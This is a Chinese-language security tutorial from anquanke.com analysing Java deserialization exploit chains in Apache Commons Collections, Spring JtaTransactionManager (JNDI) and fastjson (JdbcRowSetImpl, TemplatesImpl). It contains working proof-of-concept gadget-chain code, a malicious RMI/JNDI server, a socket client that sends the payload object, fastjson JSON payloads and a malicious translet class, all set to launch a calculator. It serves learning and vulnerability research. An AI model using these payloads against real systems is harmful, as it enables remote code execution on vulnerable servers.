@@ -1,0 +1,681 @@
+# Java反序列化漏洞的一些利用链分析
+
+阅读量 **501588**
+
+|评论 **1**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2019-03-20 12:00:14
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+![](https://p1.ssl.qhimg.com/t01fb57ac009d744145.png)
+
+> 最近学习了一下java的反序列化漏洞，对一些之前爆出来的一些开源组件的反序列化漏洞的进行了简单的分析，并总结到这篇文章中。
+
+## 项目的依赖项配置
+
+为了复现时安装各个版本的库方便我使用了maven来构建项目。我是用的maven依赖项的配置为：
+
+    
+    
+      <dependencies>
+        <dependency>
+          <groupId>junit</groupId>
+          <artifactId>junit</artifactId>
+          <version>4.11</version>
+          <scope>test</scope>
+        </dependency>
+        <dependency>
+          <groupId>commons-collections</groupId>
+          <artifactId>commons-collections</artifactId>
+          <version>3.2</version>
+        </dependency>
+        <dependency>
+    
+          <groupId>com.alibaba</groupId>
+          <artifactId>fastjson</artifactId>
+          <version>1.2.24</version>
+        </dependency>
+    
+        <dependency>
+          <groupId>commons-codec</groupId>
+          <artifactId>commons-codec</artifactId>
+          <version>1.9</version>
+        </dependency>
+    
+        <dependency>
+          <groupId>org.apache.commons</groupId>
+          <artifactId>commons-io</artifactId>
+          <version>1.3.2</version>
+        </dependency>
+    
+    
+      </dependencies>
+    
+
+## Apache common collections
+
+Apache common collections的反序列化利用链在15年左右爆出，由于许多框架都用到了这个库，因此也是造成了很大的影响。
+
+###  Pop链
+
+apache common
+collection的整个反序列化过程主要依托于transformer类以及TransformedMap类。Transformer类用于描述变换过程，而TransformedMap则将这个变换过程应用于一个Map上，当Map中的元素发生改变时则按照设置好的Transformer进行一系列的处理操作。
+
+    
+    
+    Map transformedMap=TransformedMap.decorate(map,keyTrasnfomer,valueTransformer);
+    
+
+这里便是通过一个decorate函数将一个map转换为TransformedMap,并且对map的key和value绑定相应的这里便通过一个decorate函数将一个map转换为TranformedMap,并对map的key和value绑定相应的Transformer,当`key`和`value`改变时便触发对应的`Transformer`的`transform`方法进行处理动作。
+
+如果想要实现一连串的变换操作则可以通过ChainedTransformer来实现,比如这里我们用于实现RCE的Tranformer链：
+
+    
+    
+    Transformer[] transformers = new Transformer[] {
+                    new ConstantTransformer(Runtime.class),
+                    /*
+                    由于Method类的invoke(Object obj,Object args[])方法的定义
+                    所以在反射内写new Class[] {Object.class, Object[].class }
+                    正常POC流程举例：
+                    ((Runtime)Runtime.class.getMethod("getRuntime",null).invoke(null,null)).exec("gedit");
+                    */
+                    new InvokerTransformer(
+                            "getMethod",
+                            new Class[] {String.class, Class[].class },
+                            new Object[] {"getRuntime", new Class[0] }
+                    ),
+                    new InvokerTransformer(
+                            "invoke",
+                            new Class[] {Object.class,Object[].class },
+                            new Object[] {null, null }
+                    ),
+                    new InvokerTransformer(
+                            "exec",
+                            new Class[] {String.class },
+                            new Object[] { "/Applications/Calculator.app/Contents/MacOS/Calculator" } //目标机器上反序列化后执行的命令
+                    )
+            };
+    Transformer chainedTransformer=new ChainedTransformer(transformers);
+    
+
+实际执行的代码便是`((Runtime)
+Runtime.class.getMethod("getRuntime").invoke()).exec("/Applications/Calculator.app/Contents/MacOS/Calculator")`,也就是Map下的弹计算器的指令。
+
+之后我们可以构造一个使用这个chain的TransformedMap,并且触发对这个transformedMap的处理即可
+
+    
+    
+    Map map=new HashMap();
+    map.put("a","b");
+    Map transformedMap=TransformedMap.decorate(map,null,chainedTransformer);
+    transformedMap.put("a","z");
+    
+
+执行后即可发现能够成功弹出计算器
+
+![](https://p4.ssl.qhimg.com/t017746054907b632c2.png)
+
+###  RCE构造
+
+我们已经构造出了执行命令的popChain,那样怎样才能找到一个符合条件的RCE?我们需要找到一个满足下列条件的类:
+
+  * 重写了`readObject`方法
+  * 在readObject方法中存在对一个可控的map进行修改的过程
+
+之前的很多文章都是使用的`AnnotationInvocationHandler`类,然而最开始调试时我使用的jdk版本(1.8)中该类的`readObject`方法中并没有找到对map的更改操作。后来参考反序列化自动化工具`ysoserial`中的`CommonsCollections5`这个payload实现了其中的一个调用链：利用`BadAttributeValueExpException`类。我们可以看一下这个类的readObject方法：
+
+    
+    
+    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+            ObjectInputStream.GetField gf = ois.readFields();
+            Object valObj = gf.get("val", null);
+    
+            if (valObj == null) {
+                val = null;
+            } else if (valObj instanceof String) {
+                val= valObj;
+            } else if (System.getSecurityManager() == null
+                    || valObj instanceof Long
+                    || valObj instanceof Integer
+                    || valObj instanceof Float
+                    || valObj instanceof Double
+                    || valObj instanceof Byte
+                    || valObj instanceof Short
+                    || valObj instanceof Boolean) {
+                val = valObj.toString();
+            } else { // the serialized object is from a version without JDK-8019292 fix
+                val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
+            }
+    }
+    
+
+可以看到这里我们对反序列化传入的对象的成员属性val判断其类型，如果这个变量不是String便会调用val的toString方法。这里如果我们通过反序列化传入的val是一个lazyMap类的entry，在调用其toString方法时便会调用LazyMap.get()从而触发绑定的Transformer的`transform`方法。但是这里我们的`LazyMap`类在获取一个不存在的键的时候才会触发`transform`，因此我们这里可以引入另外一个类`TiedMapEntry`,这个类在执行toString时可以调用其绑定的map取获取预定的键。
+
+因此这个poc链的执行过程为：
+
+    
+    
+    BadAtrributeValueException对象exception  ->
+    exception对象的val设置为lazyMap的TiedMapEntry,键为lazyMap中不存在的键 ->
+    调用entry的toString() ->
+    调用lazyMap的get方法获取这个不存在的键 ->
+    调用transform方法
+    
+
+具体实现：
+
+    
+    
+    Transformer chainedTransformer=new ChainedTransformer(transformers);
+    Map normalMap=new HashMap();
+    normalMap.put("hackedby","imagemlt");
+    Map lazyMap=LazyMap.decorate(normalMap,chainedTransformer);
+    
+    TiedMapEntry entry=new TiedMapEntry(lazyMap,"foo");
+    
+    BadAttributeValueExpException exception=new BadAttributeValueExpException(null);
+    Field valField=exception.getClass().getDeclaredField("val");
+    valField.setAccessible(true);
+    valField.set(exception,entry);
+    
+    File f=new File("/tmp/payload.bin");
+    ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(f));
+    out.writeObject(exception);
+    out.flush();
+    out.close();
+    
+    ObjectInputStream in=new ObjectInputStream(new FileInputStream(f));
+    in.readObject();
+    
+
+![](https://p4.ssl.qhimg.com/t0150b541056aad72b5.png)
+
+其实我们看这个反序列化的利用链可以联想到之前wordpress的phar
+反序列化RCE的漏洞也用到了一个类似的对数组进行操作的Iterator类，所以利用一个Map的附加操作也可以作为我们挖掘此类漏洞的思路。
+
+## Spring JNDI反序列化漏洞
+
+众所周知Spring框架是一款用途广泛影响深远的java框架，因此Spring框架一旦出现漏洞也是影响深远。这次分析的Spring
+jdni反序列化漏洞主要存在于spring-tx包中，该包中的`org.springframeworkl.transation.jta.JtaTransationManager`类存在JDNI反序列化的问题，可以加载我们注册的RMI链接，然后将对象发送到有漏洞的服务器从而执行远程命令。首先应当注意本文中成功执行的Poc本人仅在jdk1.7中测试成功，而jdk1.8中未测试成功。
+
+> 这里的测试环境使用的是github上的项目<https://github.com/zerothoughts/spring-jndi>
+
+###  什么是JNDI?
+
+在这里的JNDI的利用方法在下面分析fastjson的反序列化漏洞时也会用到。`JNDI`(Java Naming and Directory
+Interface)是J2EE中的重要规范之一，是一组在Java应用中访问命名和目录服务的API，使得我们能够通过名称去查询数据源从而访问需要的对象。在这里我们给出在java下的一段提供JNDI服务的代码：
+
+    
+    
+    System.out.println("Starting HTTP server");
+    HttpServer httpServer = HttpServer.create(new InetSocketAddress(8086), 0);
+    httpServer.createContext("/",new HttpFileHandler());
+    httpServer.setExecutor(null);
+    httpServer.start();
+    
+    System.out.println("Creating RMI Registry");
+    Registry registry = LocateRegistry.createRegistry(1099);
+    Reference reference = new javax.naming.Reference("ExportObject","ExportObject","http://127.0.01:8086/");
+    ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(reference);
+    registry.bind("Object", referenceWrapper);
+    
+
+这里我们创建了一个HTTP服务后又创建了一个RMI服务,并且RMI服务提供了对`ExportObject`类的查询，这里ExportObject类的源码为：
+
+    
+    
+    public class ExportObject {
+        public ExportObject() {
+            try {
+                Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
+            } catch(Exception e) {
+                e.printStackTrace();
+            }
+        }
+    
+    }
+    
+
+其功能便是执行我们验证rce时常用的调用计算器的功能。
+
+要加载ExportObject类我们可以使用以下的代码:
+
+    
+    
+    Context ctx=new InitialContext();
+    ctx.lookup("rmi://127.0.0.1:1099/Object");
+    //System.out.println("loaded obj");
+    
+
+执行以下代码后可以发现ExportObject类的构造函数被调用，弹出了计算器。
+
+###  Spring框架中的JNDI反序列化漏洞
+
+导致JNDI反序列化问题的类主要是`org.springframework.transaction.jta.JtaTransactionManager`类。跟进该类的源码中的`readObject()`函数:
+
+    
+    
+    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
+            ois.defaultReadObject();
+            this.jndiTemplate = new JndiTemplate();
+            this.initUserTransactionAndTransactionManager();
+            this.initTransactionSynchronizationRegistry();
+        }
+    
+
+继续跟进`initUserTransactionAndTransactionManager()`函数
+
+    
+    
+    protected void initUserTransactionAndTransactionManager() throws TransactionSystemException {
+        if (this.userTransaction == null) {
+            if (StringUtils.hasLength(this.userTransactionName)) {
+                this.userTransaction = this.lookupUserTransaction(this.userTransactionName);
+                this.userTransactionObtainedFromJndi = true;
+            } else {
+                this.userTransaction = this.retrieveUserTransaction();
+                if (this.userTransaction == null && this.autodetectUserTransaction) {
+                    this.userTransaction = this.findUserTransaction();
+                }
+            }
+        }
+    
+
+继续进一步跟进`lookupUserTransaction()`函数
+
+    
+    
+    protected UserTransaction lookupUserTransaction(String userTransactionName) throws TransactionSystemException {
+        try {
+            if (this.logger.isDebugEnabled()) {
+                this.logger.debug("Retrieving JTA UserTransaction from JNDI location [" + userTransactionName + "]");
+            }
+    
+            return (UserTransaction)this.getJndiTemplate().lookup(userTransactionName, UserTransaction.class);
+        } catch (NamingException var3) {
+            throw new TransactionSystemException("JTA UserTransaction is not available at JNDI location [" + userTransactionName + "]", var3);
+        }
+    }
+    
+
+可以看到最终`return
+(UserTransaction)this.getJndiTemplate().lookup(userTransactionName,
+UserTransaction.class)`,跟进`JndiTemplate`类的`lookup`方法,
+
+    
+    
+    public Object lookup(final String name) throws NamingException {
+        if (this.logger.isDebugEnabled()) {
+            this.logger.debug("Looking up JNDI object with name [" + name + "]");
+        }
+    
+        return this.execute(new JndiCallback<Object>() {
+            public Object doInContext(Context ctx) throws NamingException {
+                Object located = ctx.lookup(name);
+                if (located == null) {
+                    throw new NameNotFoundException("JNDI object with [" + name + "] not found: JNDI implementation returned null");
+                } else {
+                    return located;
+                }
+            }
+        });
+    }
+    
+
+而`execute()`方法的定义如下
+
+    
+    
+    public <T> T execute(JndiCallback<T> contextCallback) throws NamingException {
+            Context ctx = this.getContext();
+    
+            Object var3;
+            try {
+                var3 = contextCallback.doInContext(ctx);//此处触发RCE
+            } finally {
+                this.releaseContext(ctx);
+            }
+    
+            return var3;
+        }
+    
+
+可以看到在整个流程的最后将会查询最开始我们由反序列化传入的`org.springframework.transaction.jta.JtaTransactionManager`类的对象的`userTransactionName`属性，最终导致加载了我们恶意的rmi源中的恶意类，从而导致RCE。
+
+###  Poc
+
+这个漏洞的Poc构造比起之前分析的apache common collections反序列化的Poc构造显然要简单许多：
+
+    
+    
+    System.out.println("Connecting to server "+serverAddress+":"+port);
+    Socket socket=new Socket(serverAddress,port);
+    System.out.println("Connected to server");
+    String jndiAddress = "rmi://127.0.0.1:1099/Object";//恶意的rmi注册源
+    
+    org.springframework.transaction.jta.JtaTransactionManager object = new org.springframework.transaction.jta.JtaTransactionManager();
+    object.setUserTransactionName(jndiAddress);
+    
+    System.out.println("Sending object to server...");
+    ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
+    objectOutputStream.writeObject(object);
+    objectOutputStream.flush();
+    
+
+可以看到已经弹出了计算器
+
+![](https://p2.ssl.qhimg.com/t017bc0e0929300a1a2.jpg)
+
+## fastjson反序列化漏洞
+
+与上面的利用链不同，之前我们介绍到的利用链都是由`readObject()`方法触发，而在fastjson的反序列化中我们触发漏洞则是利用了目标类的`setXXX()`方法和`getXXX()`方法，因为这两个方法是fastjson在完成反序列化时需要调用的方法。
+
+关于fastjson的反序列化我测试了两种不同的利用链，分别为`JdbcRowSetImpl`与`TemplatesImpl`.前者正如同之前测试的spring
+jndi反序列化漏洞，使用了JNDI这一java特性来实现RCE；而后者则使用了另一套不同的机制。这里给出两种利用链的分析。
+
+## JdbcRowSetImpl
+
+利用JdbcRowSetImpl时使用的payload主要如下:
+
+    
+    
+    {
+        "@type":"com.sun.rowset.JdbcRowSetImpl",
+        "dataSourceName":"rmi://127.0.0.1:3456/Object",
+        "autoCommit":true
+    }
+    
+
+在触发反序列化时会调用`JdbcRowSetImpl`类的 `setAutoCommit`函数
+
+    
+    
+    public void setAutoCommit(boolean var1) throws SQLException {
+            if (this.conn != null) {
+                this.conn.setAutoCommit(var1);
+            } else {
+                this.conn = this.connect();
+                this.conn.setAutoCommit(var1);
+            }
+    }
+    
+
+继续跟进`connect`函数
+
+    
+    
+    protected Connection connect() throws SQLException {
+            if (this.conn != null) {
+                return this.conn;
+            } else if (this.getDataSourceName() != null) {
+                try {
+                    InitialContext var1 = new InitialContext();
+                    DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+                    return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
+                } catch (NamingException var3) {
+                    throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
+                }
+            } else {
+                return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
+            }
+    }
+    
+
+可以看到当conn为null时会发起JNDI查询从而加载我们的恶意类,这条利用链也是很简单的一条利用链，其缺陷也很明显，在jdk版本1.8时无法直接使用。
+
+## TemplatesImpl
+
+payload如下:
+
+    
+    
+    {    "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+        "_bytecodes":["base64编码后的继承于AbstractTranslet类的子类的class文件"],
+        '_name':'a.b',
+        '_tfactory':{ },
+        "_outputProperties":{ },
+        "_version":"1.0",
+        "allowedProtocols":"all"
+    }
+    
+
+由于`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`类的`outputProperties`属性类型为`Properties`因此在反序列化过程中会调用该类的`getOutputProperties`方法。
+
+    
+    
+    public synchronized Properties getOutputProperties() {
+        try {
+            return newTransformer().getOutputProperties();
+        }
+        catch (TransformerConfigurationException e) {
+            return null;
+        }
+    }
+    
+
+继续跟进`newTransformer`方法
+
+    
+    
+    public synchronized Transformer newTransformer()
+            throws TransformerConfigurationException
+        {
+            TransformerImpl transformer;
+    
+            transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
+                _indentNumber, _tfactory);//this line
+    
+            if (_uriResolver != null) {
+                transformer.setURIResolver(_uriResolver);
+            }
+    
+            if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
+                transformer.setSecureProcessing(true);
+            }
+            return transformer;
+        }
+    
+
+在`newTransformer`方法中需要实例化一个TransformerImpl类的对象，跟进`getTransletInstance()`方法
+
+    
+    
+    private Translet getTransletInstance()
+            throws TransformerConfigurationException {
+            try {
+                if (_name == null) return null;
+    
+                if (_class == null) defineTransletClasses();
+    
+                // The translet needs to keep a reference to all its auxiliary
+                // class to prevent the GC from collecting them
+                AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
+                translet.postInitialization();
+                translet.setTemplates(this);
+                translet.setServicesMechnism(_useServicesMechanism);
+                translet.setAllowedProtocols(_accessExternalStylesheet);
+                if (_auxClasses != null) {
+                    translet.setAuxiliaryClasses(_auxClasses);
+                }
+    
+                return translet;
+            }
+            catch (InstantiationException e) {
+                ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+                throw new TransformerConfigurationException(err.toString());
+            }
+            catch (IllegalAccessException e) {
+                ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+                throw new TransformerConfigurationException(err.toString());
+            }
+        }
+    
+
+跟进`defineTransletClasses`方法中
+
+    
+    
+    private void defineTransletClasses()
+            throws TransformerConfigurationException {
+    
+            if (_bytecodes == null) {
+                //...
+            }
+    
+            TransletClassLoader loader = (TransletClassLoader)
+                AccessController.doPrivileged(new PrivilegedAction() {
+                    public Object run() {
+                        return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
+                    }
+                });
+    
+            try {
+                final int classCount = _bytecodes.length;
+                _class = new Class[classCount];
+    
+                if (classCount > 1) {
+                    _auxClasses = new Hashtable();
+                }
+    
+                for (int i = 0; i < classCount; i++) {
+                    _class[i] = loader.defineClass(_bytecodes[i]);
+                    final Class superClass = _class[i].getSuperclass();
+    
+                    // Check if this is the main class
+                    if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
+                        _transletIndex = i;
+                    }
+                    else {
+                        _auxClasses.put(_class[i].getName(), _class[i]);
+                    }
+                }
+    
+                if (_transletIndex < 0) {
+                    ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
+                    throw new TransformerConfigurationException(err.toString());
+                }
+            }
+            catch (ClassFormatError e) {
+                ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
+                throw new TransformerConfigurationException(err.toString());
+            }
+            catch (LinkageError e) {
+                ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+                throw new TransformerConfigurationException(err.toString());
+            }
+        }
+    
+
+可以看到该方法将会遍历我们传入的`_bytecodes`数组，执行`loader.defineClass`方法，而`TransletClassLoader`类的defineClass方法如下:
+
+    
+    
+    Class defineClass(final byte[] b) {
+                return defineClass(null, b, 0, b.length);
+            }
+    
+
+可见直接实现于`ClassLoader`类的`defineClass`方法。查询jdk1.8的文档
+
+![](https://p4.ssl.qhimg.com/t01594516119f88ddb0.jpg)
+
+可以看到该方法会将我们传入的编码后的class文件加载入jvm。
+
+而我们的恶意类继承于`ABSTRACT_TRANSLET`，即`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`，因此便会设置`_transletIndex`为0。再回到我们的`getTransletInstance`方法中，
+
+    
+    
+    AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
+    
+
+生成了一个我们的恶意类的对象实例，因此导致了我们的恶意类中的代码最后被执行。
+
+这里我们使用的恶意类如下:
+
+    
+    
+    package JavaUnser;
+    
+    import com.sun.org.apache.xalan.internal.xsltc.DOM;
+    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+    
+    import java.io.IOException;
+    
+    public class ShellExec extends AbstractTranslet{
+        public ShellExec() throws IOException{
+            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
+        }
+        @Override
+        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
+        }
+        @Override
+        public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
+        }
+    
+        public static void main(String[] args) throws Exception {
+            //ShellExec t = new ShellExec();
+        }
+    
+    }
+    
+
+当fastjson反序列化执行我们的payload时便可以触发构造方法中的操作从而导致RCE。
+
+## 后记
+
+这里分析的几条反序列化的利用链属于分析难度不算特别大的反序列化利用链，便于我们入门java反序列化漏洞。相关的测试代码已经放到了[github](https://github.com/imagemlt/JavaUnserializePocs)上,大家可以clone该项目下断点测试.另外最近在jdk1.8下对于JNDI限制的绕过后来阅读了一些大佬的博客(<https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html>) 得知存在绕过限制的方法，大家也可以去测试一下。
+
+## 参考文章
+
+  * <https://www.freebuf.com/vuls/175252.html>
+  * <https://github.com/frohoff/ysoserial>
+  * <http://pirogue.org/2017/12/22/javaSerialKiller/>
+  * <https://blog.csdn.net/wn084/article/details/80729230>
+  * <https://github.com/zerothoughts/spring-jndi>
+  * <https://bl4ck.in/tricks/2019/01/04/JNDI-Injection-Bypass.html>
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **差池其羽** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/173459](/post/id/173459)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [Web安全](/tag/Web安全)
+  * [反序列化](/tag/反序列化)
+  * [Java](/tag/Java)
+
+ **+1** __12赞
+
+ __收藏
+
+![](https://thirdqq.qlogo.cn/qqapp/101430193/5222C368D173BB82F8C7FFE6375E88DE/40)
+差池其羽
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
